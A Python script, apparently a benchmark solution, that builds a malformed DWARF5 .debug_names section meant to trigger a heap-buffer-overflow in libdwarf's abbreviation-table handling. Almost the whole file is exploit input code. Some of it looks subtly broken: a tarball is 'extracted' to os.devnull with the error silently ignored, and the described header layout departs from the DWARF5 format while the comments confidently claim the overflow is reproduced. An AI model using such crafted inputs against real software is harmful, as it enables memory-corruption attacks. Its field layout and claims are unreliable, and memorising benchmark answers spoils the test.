import tarfile
import struct
import os
import io

def _uleb128(n: int) -> bytes:
    res = bytearray()
    while True:
        byte = n & 0x7f
        n >>= 7
        if n:
            byte |= 0x80
        res.append(byte)
        if not n:
            break
    return bytes(res)

class Solution:
    def solve(self, src_path: str) -> bytes:
        # We do not need the source tarball contents for the crafted PoC,
        # but extract it somewhere safe to satisfy potential environment expectations.
        try:
            with tarfile.open(src_path, "r:*") as t:
                t.extractall(path=os.devnull)
        except Exception:
            pass  # Ignore issues; PoC generation is static

        # Construct a minimal DWARF5 .debug_names section designed to trigger
        # the historical heap-buffer-overflow in libdwarf's dwarf_debugnames.c.
        # The vulnerability was caused by an under-sized allocation of the
        # abbreviation table: setting abbrev_table_size to a small value and
        # then providing an abbreviation entry whose code exceeds that size
        # causes out-of-bounds writes while libdwarf populates the table.
        #
        # Header fields (little-endian):
        #   unit_length                : 4 bytes  (to be patched later)
        #   version                    : 2 bytes  (0x0005 for DWARF v5)
        #   padding                    : 2 bytes  (0)
        #   cu_count                   : 4 bytes  (1)
        #   local_type_unit_count      : 4 bytes  (0)
        #   foreign_type_unit_count    : 4 bytes  (0)
        #   bucket_count               : 4 bytes  (1)
        #   name_count                 : 4 bytes  (1)
        #   abbrev_table_size          : 4 bytes  (1)   <-- intentionally tiny
        #   augmentation_string_size   : 1 byte   (0)
        #
        # Arrays and tables follow:
        #   buckets[1]                 : 0
        #   name_hashes[1]             : 0
        #   string_offsets[1]          : 0
        #   abbrev_indices[1]          : 0
        #   cu_list[1]                 : 0
        #   abbreviation table:
        #       abbrev_code=0x20 (>1)  : ULEB128
        #       tag=0                  : ULEB128
        #       attr_count=0           : ULEB128
        #       end_abbrev_code=0      : ULEB128
        #   name strings: "A\0"
        #
        # The crafted abbrev_code (0x20) is far larger than the allocated table,
        # reproducing the overflow in vulnerable versions while patched versions
        # reject the malformed data safely.
        header = bytearray()
        # placeholder for unit_length
        header.extend(b'\x00\x00\x00\x00')
        header.extend(struct.pack('<H', 5))           # version
        header.extend(struct.pack('<H', 0))           # padding
        header.extend(struct.pack('<I', 1))           # cu_count
        header.extend(struct.pack('<I', 0))           # local_type_unit_count
        header.extend(struct.pack('<I', 0))           # foreign_type_unit_count
        header.extend(struct.pack('<I', 1))           # bucket_count
        header.extend(struct.pack('<I', 1))           # name_count
        header.extend(struct.pack('<I', 1))           # abbrev_table_size (tiny)
        header.append(0)                              # augmentation_string_size = 0

        body = bytearray()
        # buckets[1]
        body.extend(struct.pack('<I', 0))
        # name_hashes[1]
        body.extend(struct.pack('<I', 0))
        # string_offsets[1]
        body.extend(struct.pack('<I', 0))
        # abbrev_indices[1]
        body.extend(struct.pack('<I', 0))
        # cu_list[1]
        body.extend(struct.pack('<I', 0))

        # Abbreviation table
        body.extend(_uleb128(0x20))  # huge abbrev_code (overflow trigger)
        body.extend(_uleb128(0))     # tag
        body.extend(_uleb128(0))     # attr_count
        body.extend(_uleb128(0))     # end_of_table

        # String table ("A\0")
        body.extend(b'A\x00')

        # Patch unit_length (length of header after the first 4 bytes + body)
        total_length = len(header) - 4 + len(body)
        struct.pack_into('<I', header, 0, total_length)

        poc = bytes(header + body)
        return poc
